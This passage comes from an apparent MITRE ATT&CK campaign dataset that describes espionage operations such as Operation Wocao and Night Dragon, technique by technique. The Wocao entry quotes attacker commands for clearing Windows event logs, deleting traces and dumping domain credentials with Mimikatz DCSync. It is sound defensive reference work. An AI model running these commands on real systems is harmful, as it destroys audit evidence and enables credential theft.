TEARDROP and Raindrop . Retrieved January 22, 2021. NCSC, CISA, FBI, NSA. (2021, May 7). Further TTPs associated with SVR cyber actors. Retrieved July 29, 2021. Symantec Threat Hunter Team. (2021, January 18). Raindrop: New Malware Discovered in SolarWinds Investigation. Retrieved January 19, 2021. CrowdStrike Intelligence Team. (2021, January 11). SUNSPOT: An Implant in the Build Process. Retrieved January 11, 2021. Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021. Symantec Threat Hunter Team. (2021, January 22). SolarWinds: How Sunburst Sends Data Back to the Attackers. Retrieved January 22, 2021. Stephen Eckels, Jay Smith, William Ballenthin. (2020, December 24). SUNBURST Additional Technical Details. Retrieved January 6, 2021. Check Point Research. (2020, December 22). SUNBURST, TEARDROP and the NetSec New Normal. Retrieved January 6, 2021. "
},
{
"id": 1749,
"title": "C0010, Campaign C0010",
"path": "/campaigns/C0010/index.html",
"content": " C0010 C0010 was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. C0010 began by at least late 2020, and was still ongoing as of mid-2022.[1] ID: C0010 First Seen: December 2020 [1] Last Seen: August 2022 [1] Version: 1.0 Created: 21 September 2022 Last Modified: 04 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.[1] Enterprise T1584 .001 Compromise Infrastructure: Domains During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.[1] Enterprise T1587 .001 Develop Capabilities: Malware For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.[1] Enterprise T1189 Drive-by Compromise During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.[1] Enterprise T1105 Ingress Tool Transfer During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.[1] .002 Stage Capabilities: Upload Tool For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.[1] .004 Stage Capabilities: Drive-by Target For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.[1] Software ID Name Description S1042 SUGARDUMP [1] S1049 SUGARUSH [1] References Mandiant Israel Research Team. (2022, August 17). Suspected Iranian Actor Targeting Israeli Shipping, Healthcare, Government and Energy Sectors. Retrieved September 21, 2022. "
},
{
"id": 1750,
"title": "Operation Wocao, Campaign C0014",
"path": "/campaigns/C0014/index.html",
"content": " Operation Wocao Operation Wocao was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies.[1] Security researchers assessed the Operation Wocao actors used similar TTPs and tools as APT20, suggesting a possible overlap. Operation Wocao was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access.[1] ID: C0014 First Seen: December 2017 [1] Last Seen: December 2019 [1] Contributors: Erik Schamper, @Schamperr, Fox-IT; Maarten van Dantzig, @MaartenVDantzig, Fox-IT Version: 1.1 Created: 27 September 2022 Last Modified: 22 March 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account During Operation Wocao, threat actors used the net command to retrieve information about domain accounts.[1] Enterprise T1583 .004 Acquire Infrastructure: Server For Operation Wocao, the threat actors purchased servers with Bitcoin to use during the operation.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation Wocao, threat actors’ XServer tool communicated using HTTP and HTTPS.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Wocao, threat actors archived collected files with WinRAR, prior to exfiltration.[1] Enterprise T1119 Automated Collection During Operation Wocao, threat actors used a script to collect information about the infected system.[1] Enterprise T1115 Clipboard Data During Operation Wocao, threat actors collected clipboard data in plaintext.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Operation Wocao, threat actors used PowerShell on compromised systems.[1] .003 Command and Scripting Interpreter: Windows Command Shell During Operation Wocao, threat actors spawned a new cmd.exe process to execute commands.[1] .005 Command and Scripting Interpreter: Visual Basic During Operation Wocao, threat actors used VBScript to conduct reconnaissance on targeted systems.[1] .006 Command and Scripting Interpreter: Python During Operation Wocao, threat actors' backdoors were written in Python and compiled with py2exe.[1] Enterprise T1555 .005 Credentials from Password Stores: Password Managers During Operation Wocao, threat actors accessed and collected credentials from password managers.[1] Enterprise T1005 Data from Local System During Operation Wocao, threat actors exfiltrated files and directories of interest from the targeted system.[1] Enterprise T1001 Data Obfuscation During Operation Wocao, threat actors encrypted IP addresses used for \"Agent\" proxy hops with RC4.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Operation Wocao, threat actors staged archived files in a temporary directory prior to exfiltration.[1] Enterprise T1587 .001 Develop Capabilities: Malware During Operation Wocao, threat actors developed their own custom webshells to upload to compromised servers.[1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography During Operation Wocao, threat actors' proxy implementation \"Agent\" upgraded the socket in use to a TLS socket.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For Operation Wocao, the threat actors registered email accounts to use during the campaign.[1] Enterprise T1041 Exfiltration Over C2 Channel During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data.[1] Enterprise T1190 Exploit Public-Facing Application During Operation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.[1] Enterprise T1133 External Remote Services During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN.[1] Enterprise T1083 File and Directory Discovery During Operation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest.[1] Enterprise T1589 Gather Victim Identity Information During Operation Wocao, threat actors targeted people based on their organizational roles and privileges.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall During Operation Wocao, threat actors used PowerShell to add and delete rules in the Windows firewall.[1] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs During Operation Wocao, the threat actors deleted all Windows system and security event logs using /Q /c wevtutil cl system and /Q /c wevtutil cl security.[1] .004 Indicator Removal: File Deletion During Operation Wocao, the threat actors consistently removed traces of their activity by first overwriting a file using /c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y and then deleting the overwritten file using /c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1.[1] Enterprise T1105 Ingress Tool Transfer During Operation Wocao, threat actors downloaded additional files to the infected system.[1] Enterprise T1056 .001 Input Capture: Keylogging During Operation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger.[1] Enterprise T1570 Lateral Tool Transfer During Operation Wocao, threat actors used SMB to copy files to and from target systems.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Name or Location During Operation Wocao, the threat actors renamed some tools and executables to appear as legitimate programs.[1] Enterprise T1112 Modify Registry During Operation Wocao, the threat actors enabled Wdigest by changing the HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest registry value from 0 (disabled) to 1 (enabled).[1] Enterprise T1111 Multi-Factor Authentication Interception During Operation Wocao, threat actors used a custom collection method to intercept two-factor authentication soft tokens.[1] Enterprise T1106 Native API During Operation Wocao, threat actors used the CreateProcessA and ShellExecute API functions to launch commands after being injected into a selected process.[1] Enterprise T1046 Network Service Discovery During Operation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.[1] Enterprise T1135 Network Share Discovery During Operation Wocao, threat actors discovered network disks mounted to the system using netstat.[1] Enterprise T1095 Non-Application Layer Protocol During Operation Wocao, threat actors used a custom protocol for command and control.[1] Enterprise T1571 Non-Standard Port During Operation Wocao, the threat actors used uncommon high ports for its backdoor C2, including ports 25667 and 47000.[1] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools During Operation Wocao, threat actors edited variable names within the Impacket suite to avoid automated detection.[1] .010 Obfuscated Files or Information: Command Obfuscation During Operation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation Wocao, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and BloodHound.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During Operation Wocao, threat actors used ProcDump to dump credentials from memory.[1] .006 OS Credential Dumping: DCSync During Operation Wocao, threat actors used Mimikatz's DCSync to dump credentials from the memory of the targeted system.[1] Enterprise T1120 Peripheral Device Discovery During Operation Wocao, threat actors discovered removable disks attached to a system.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During Operation Wocao, threat actors used the command net localgroup administrators to list all administrators part of a local group.[1] Enterprise T1057 Process Discovery During Operation Wocao, the threat actors used tasklist to collect a list of running processes on an infected system.[1] Enterprise T1055 Process Injection During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[1] Enterprise T1090 Proxy During Operation Wocao, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops.[1] .001 Internal Proxy During Operation Wocao, threat actors proxied traffic through multiple infected systems.[1] .003 Multi-hop Proxy During Operation Wocao, threat actors executed commands through the installed web shell via Tor exit nodes.[1] Enterprise T1012 Query Registry During Operation Wocao, the threat actors executed /c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\ to detect recent PuTTY sessions, likely to further lateral movement.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares During Operation Wocao, threat actors used Impacket's smbexec.py as well as accessing the C$ and IPC$ shares to move laterally.[1] Enterprise T1018 Remote System Discovery During Operation Wocao, threat actors used nbtscan and ping to discover remote systems, as well as dsquery subnet on a domain controller to retrieve all subnets in the Active Directory.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation Wocao, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.[1] Enterprise T1505 .003 Server Software Component: Web Shell During Operation Wocao, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.[1] Enterprise T1518 Software Discovery During Operation Wocao, threat actors collected a list of installed software on the infected system.[1] .001 Security Software Discovery During Operation Wocao, threat actors used scripts to detect security software.[1] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting During Operation Wocao, threat actors used PowerSploit's Invoke-Kerberoast module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.[1] Enterprise T1082 System Information Discovery During Operation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.[1] Enterprise T1016 System Network Configuration Discovery During Operation Wocao, threat actors discovered the local network configuration with ipconfig.[1] .001 Internet Connection Discovery During Operation Wocao, threat actors used a Visual Basic script that checked for internet connectivity.[1] Enterprise T1049 System Network Connections Discovery During Operation Wocao, threat actors collected a list of open connections on the infected system using netstat and checks whether it has an internet connection.[1] Enterprise T1033 System Owner/User Discovery During Operation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.[1] Enterprise T1007 System Service Discovery During Operation Wocao, threat actors used the tasklist command to search for one of its backdoors.[1] Enterprise T1569 .002 System Services: Service Execution During Operation Wocao, threat actors created services on remote systems for execution purposes.[1] Enterprise T1124 System Time Discovery During Operation Wocao, threat actors used the time command to retrieve the current time of a compromised system.[1] Enterprise T1552 .004 Unsecured Credentials: Private Keys During Operation Wocao, threat actors used Mimikatz to dump certificates and private keys from the Windows certificate store.[1] Enterprise T1078 Valid Accounts During Operation Wocao, threat actors used valid VPN credentials to gain initial access.[1] .002 Domain Accounts During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.[1] .003 Local Accounts During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.[1] Enterprise T1047 Windows Management Instrumentation During Operation Wocao, threat actors has used WMI to execute commands.[1] Software ID Name Description S0521 BloodHound During Operation Wocao, threat actors used BloodHound discover trust between domains.[1] S0105 dsquery During Operation Wocao, threat actors used dsquery to retrieve all subnets in the Active Directory.[1] S0357 Impacket During Operation Wocao, threat actors used smbexec.py and psexec.py from Impacket for lateral movement.[1] S0002 Mimikatz During Operation Wocao, threat actors used Mimikatz with the privilege::debug and lsadump::dcsync /all flags to dump account credentials.[1] S0104 netstat During Operation Wocao, threat actors used netstat to identify specific ports.[1] S0194 PowerSploit During Operation Wocao, threat actors used PowerSploit’s Invoke-Kerberoast module to bruteforce passwords and retrieve encrypted service tickets.[1] S0029 PsExec During Operation Wocao, threat actors used PsExec to interact with other systems inside the internal network.[1] S0183 Tor During Operation Wocao, threat actors used Tor exit nodes to execute commands.[1] S0645 Wevtutil During Operation Wocao, threat actors used Wevtutil to delete system and security event logs with wevtutil cl system and wevtutil cl security.[1] References Dantzig, M. v., Schamper, E. (2019, December 19). Operation Wocao: Shining a light on one of China’s hidden hacking groups. Retrieved October 8, 2020. "
},
{
"id": 1751,
"title": "Operation Spalax, Campaign C0005",
"path": "/campaigns/C0005/index.html",
"content": " Operation Spalax Operation Spalax was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The Operation Spalax threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to APT-C-36, however identified enough differences to report this as separate, unattributed activity.[1] ID: C0005 First Seen: November 2019 [1] Last Seen: January 2021 [1] Version: 1.0 Created: 16 September 2022 Last Modified: 13 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Spalax, the threat actors registered hundreds of domains using Duck DNS and DNS Exit.[1] Enterprise T1059 Command and Scripting Interpreter For Operation Spalax, the threat actors used Nullsoft Scriptable Install System (NSIS) scripts to install malware.[1] Enterprise T1140 Deobfuscate/Decode Files or Information For Operation Spalax, the threat actors used a variety of packers and droppers to decrypt malicious payloads.[1] Enterprise T1568 Dynamic Resolution For Operation Spalax, the threat actors used dynamic DNS services, including Duck DNS and DNS Exit, as part of their C2 infrastructure.[1] Enterprise T1027 Obfuscated Files or Information For Operation Spalax, the threat actors used XOR-encrypted payloads.[1] .002 Software Packing For Operation Spalax, the threat actors used a variety of packers, including CyaX, to obfuscate malicious executables.[1] .003 Steganography For Operation Spalax, the threat actors used packers that read pixel data from images contained in PE files' resource sections and build the next layer of execution from the data.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For Operation Spalax, the threat actors obtained malware, including Remcos, njRAT, and AsyncRAT.[1] .002 Obtain Capabilities: Tool For Operation Spalax, the threat actors obtained packers such as CyaX.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Spalax, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.[1] .002 Phishing: Spearphishing Link During Operation Spalax, the threat actors sent phishing emails to victims that contained a malicious link.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Spalax, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.[1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During Operation Spalax, the threat actors used rundll32.exe to execute malicious installers.[1] Enterprise T1204 .001 User Execution: Malicious Link During Operation Spalax, the threat actors relied on a victim to click on a malicious link distributed via phishing emails.[1] .002 User Execution: Malicious File During Operation Spalax, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.[1] Enterprise T1497 Virtualization/Sandbox Evasion During Operation Spalax, the threat actors used droppers that would run anti-analysis checks before executing malware on a compromised host.[1] Enterprise T1102 Web Service During Operation Spalax, the threat actors used OneDrive and MediaFire to host payloads.[1] Software ID Name Description S0385 njRAT [1] S0332 Remcos [1] References M. Porolli. (2021, January 21). Operation Spalax: Targeted malware attacks in Colombia. Retrieved September 16, 2022. "
},
{
"id": 1752,
"title": "C0011, Campaign C0011",
"path": "/campaigns/C0011/index.html",
"content": " C0011 C0011 was a suspected cyber espionage campaign conducted by Transparent Tribe that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from Transparent Tribe's historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022.[1] ID: C0011 First Seen: December 2021 [1] Last Seen: July 2022 [1] Version: 1.0 Created: 22 September 2022 Last Modified: 22 September 2022 Version Permalink Live Version Groups ID Name Description G0134 Transparent Tribe [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0011, Transparent Tribe registered domains likely designed to appear relevant to student targets in India.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic For C0011, Transparent Tribe used malicious VBA macros within a lure document as part of the Crimson malware installation process onto a compromised host.[1] Enterprise T1587 .003 Develop Capabilities: Digital Certificates For C0011, Transparent Tribe established SSL certificates on the typo-squatted domains the group registered.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During C0011, Transparent Tribe sent malicious attachments via email to student targets in India.[1] .002 Phishing: Spearphishing Link During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0011, Transparent Tribe hosted malicious documents on domains registered by the group.[1] Enterprise T1204 .001 User Execution: Malicious Link During C0011, Transparent Tribe relied on student targets to click on a malicious link sent via email.[1] .002 User Execution: Malicious File During C0011, Transparent Tribe relied on a student target to open a malicious document delivered via email.[1] Software ID Name Description S0115 Crimson For C0011, Transparent Tribe used an updated version of Crimson.[1] References N. Baisini. (2022, July 13). Transparent Tribe begins targeting education sector in latest campaign. Retrieved September 22, 2022. "
},
{
"id": 1753,
"title": "Operation Ghost, Campaign C0023",
"path": "/campaigns/C0023/index.html",
"content": " Operation Ghost Operation Ghost was an APT29 campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During Operation Ghost, APT29 used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim.[1] ID: C0023 First Seen: September 2013 [1] Last Seen: October 2019 [1] Version: 1.0 Created: 23 March 2023 Last Modified: 06 April 2023 Version Permalink Live Version Groups ID Name Description G0016 APT29 [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Ghost, APT29 registered domains for use in C2 including some crafted to appear as existing legitimate domains.[1] Enterprise T1001 .002 Data Obfuscation: Steganography During Operation Ghost, APT29 used steganography to hide the communications between the implants and their C&C servers.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Ghost, APT29 used new strains of malware including FatDuke, MiniDuke, RegDuke, and PolyglotDuke.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts For Operation Ghost, APT29 registered Twitter accounts to host C2 nodes.[1] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware.[1] Enterprise T1027 .003 Obfuscated Files or Information: Steganography During Operation Ghost, APT29 used steganography to hide payloads inside valid images.[1] Enterprise T1078 .002 Valid Accounts: Domain Accounts For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks.[1] Enterprise T1102 .002 Web Service: Bidirectional Communication For Operation Ghost, APT29 used social media platforms to hide communications to C2 servers.[1] Software ID Name Description S0512 FatDuke For Operation Ghost, APT29 used FatDuke as a third-stage backdoor.[1] S0051 MiniDuke For Operation Ghost, APT29 used MiniDuke as a second-stage backdoor.[1] S0518 PolyglotDuke For Operation Ghost, APT29 used PolyglotDuke as a first-stage downloader.[1] S0029 PsExec For Operation Ghost, APT29 used PsExec for lateral movement on compromised networks.[1] S0511 RegDuke For Operation Ghost, APT29 used RegDuke as a first-stage implant.[1] References Faou, M., Tartare, M., Dupuy, T. (2019, October). OPERATION GHOST. Retrieved September 23, 2020. "
},
{
"id": 1754,
"title": "Operation Dust Storm, Campaign C0016",
"path": "/campaigns/C0016/index.html",
"content": " Operation Dust Storm Operation Dust Storm was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the Operation Dust Storm threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction.[1] Operation Dust Storm threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea.[1] ID: C0016 First Seen: January 2010 [1] Last Seen: February 2016 [1] Version: 1.0 Created: 29 September 2022 Last Modified: 30 September 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For Operation Dust Storm, the threat actors established domains as part of their operational infrastructure.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During Operation Dust Storm, the threat actors used Visual Basic scripts.[1] .007 Command and Scripting Interpreter: JavaScript During Operation Dust Storm, the threat actors used JavaScript code.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Operation Dust Storm, attackers used VBS code to decode payloads.[1] Enterprise T1189 Drive-by Compromise During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.[1] Enterprise T1568 Dynamic Resolution For Operation Dust Storm, the threat actors used dynamic DNS domains from a variety of free providers, including No-IP, Oray, and 3322.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For Operation Dust Storm, the threat actors established email addresses to register domains for their operations.[1] Enterprise T1203 Exploitation for Client Execution During Operation Dust Storm, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.[1] Enterprise T1036 Masquerading For Operation Dust Storm, the threat actors disguised some executables as JPG files.[1] Enterprise T1027 Obfuscated Files or Information During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.[1] .002 Software Packing For Operation Dust Storm, the threat actors used UPX to pack some payloads.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.[1] .002 Phishing: Spearphishing Link During Operation Dust Storm, the threat actors sent spearphishing emails containing a malicious link.[1] Enterprise T1518 Software Discovery During Operation Dust Storm, the threat actors deployed a file called DeployJava.js to fingerprint installed software on a victim system prior to exploit delivery.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta During Operation Dust Storm, the threat actors executed JavaScript code via mshta.exe.[1] Enterprise T1204 .001 User Execution: Malicious Link During Operation Dust Storm, the threat actors relied on a victim clicking on a malicious link sent via email.[1] .002 User Execution: Malicious File During Operation Dust Storm, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.[1] Mobile T1533 Data from Local System During Operation Dust Storm, the threat actors used Android backdoors capable of exfiltrating specific files directly from the infected devices.[1] Mobile T1646 Exfiltration Over C2 Channel During Operation Dust Storm, the threat actors used Android backdoors that would send information and data from a victim's mobile device to the C2 servers.[1] Mobile T1420 File and Directory Discovery During Operation Dust Storm, the threat actors used Android backdoors capable of enumerating specific files on the infected devices.[1] Mobile T1636 .004 Protected User Data: SMS Messages During Operation Dust Storm, the threat actors used Android backdoors to continually forward all SMS messages and call information back to their C2 servers.[1] Software ID Name Description S0032 gh0st RAT [1] S0084 Mis-Type [1] S0083 Misdat [1] S0012 PoisonIvy [1] S0085 S-Type [1] S0086 ZLib [1] References Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021. "
},
{
"id": 1755,
"title": "Night Dragon, Campaign C0002",
"path": "/campaigns/C0002/index.html",
"content": " Night Dragon Night Dragon was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China.[1] ID: C0002 First Seen: November 2009 [1] Last Seen: February 2011 [1] Version: 1.0 Created: 08 September 2022 Last Modified: 22 September 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .004 Acquire Infrastructure: Server During Night Dragon, threat actors purchased hosted services to use for C2.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Night Dragon, threat actors used HTTP for C2.[1] Enterprise T1110 .002 Brute Force: Password Cracking During Night Dragon, threat actors used Cain & Abel to crack password hashes.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and run command-line shells.[1] Enterprise T1584 .004 Compromise Infrastructure: Server During Night Dragon, threat actors compromised web servers to use for C2.[1] Enterprise T1005 Data from Local System During Night Dragon, the threat actors collected files and other data from compromised systems.[1] Enterprise T1074 .002 Data Staged: Remote Data Staging During Night Dragon, threat actors copied files to company web servers and subsequently downloaded them.[1] Enterprise T1568 Dynamic Resolution During Night Dragon, threat actors used dynamic DNS services for C2.[1] Enterprise T1114 .001 Email Collection: Local Email Collection During Night Dragon, threat actors used RAT malware to exfiltrate email archives.[1] Enterprise T1190 Exploit Public-Facing Application During Night Dragon, threat actors used SQL injection exploits against extranet web servers to gain access.[1] Enterprise T1133 External Remote Services During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[1] Enterprise T1008 Fallback Channels During Night Dragon, threat actors used company extranet servers as secondary C2 servers.[1] Enterprise T1083 File and Directory Discovery During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During Night Dragon, threat actors disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors also disabled proxy settings to allow direct communication from victims to the Internet.[1] Enterprise T1105 Ingress Tool Transfer During Night Dragon, threat actors used administrative utilities to deliver Trojan components to remote systems.[1] Enterprise T1112 Modify Registry During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.[1] Enterprise T1027 Obfuscated Files or Information During Night Dragon, threat actors used a DLL that included an XOR-encoded section.[1] .002 Software Packing During Night Dragon, threat actors used software packing in its tools.[1] Enterprise T1588 .001 Obtain Capabilities: Malware During Night Dragon, threat actors used Trojans from underground hacker websites.[1] .002 Obtain Capabilities: Tool During Night Dragon, threat actors obtained and used tools such as gsecdump.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During Night Dragon, threat actors dumped account hashes using gsecdump.[1] Enterprise T1566 .002 Phishing: Spearphishing Link During Night Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded.[1] Enterprise T1219 Remote Access Software During Night Dragon, threat actors used several remote administration tools as persistent infiltration channels.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware During Night Dragon, threat actors uploaded commonly available hacker tools to compromised web servers.[1] Enterprise T1033 System Owner/User Discovery During Night Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash During Night Dragon, threat actors used pass-the-hash tools to obtain authenticated access to sensitive internal desktops and servers.[1] Enterprise T1204 .001 User Execution: Malicious Link During Night Dragon, threat actors enticed users to click on links in spearphishing emails to download malware.[1] Enterprise T1078 Valid Accounts During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[1] .002 Domain Accounts During Night Dragon, threat actors used domain accounts to gain further access to victim systems.[1] Software ID Name Description S0073 ASPXSpy During Night Dragon, threat actors deployed ASPXSpy on compromised web servers.[1] S0110 at During Night Dragon, threat actors used at to execute droppers.[1] S0008 gsecdump During Night Dragon, threat actors used gsecdump to dump account hashes.[1] S0029 PsExec During Night Dragon, threat actors used PsExec to remotely execute droppers.[1] S0350 zwShell During Night Dragon, threat actors used zwShell to generate Trojan variants, control victim machines, and exfiltrate data.[1] References McAfee® Foundstone® Professional Services and McAfee Labs™. (2011, February 10). Global Energy Cyberattacks: “Night Dragon”. Retrieved February 19, 2018. "
},
{
"id": 1756,
"title": "C0021, Campaign C0021",
"path": "/campaigns/C0021/index.html",
"content": " C0021 C0021 was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. C0021's technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected APT29 activity.[1][2] ID: C0021 First Seen: November 2018 [2][1] Last Seen: November 2018 [2][1] Version: 1.0 Created: 15 March 2023 Last Modified: 05 April 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For C0021, the threat actors registered domains for use in C2.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0021, the threat actors used HTTP for some of their C2 communications.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During C0021, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.[2][1] Enterprise T1584 .001 Compromise Infrastructure: Domains For C0021, the threat actors used legitimate but compromised domains to host malicious payloads.[1] Enterprise T1140 Deobfuscate/Decode Files or 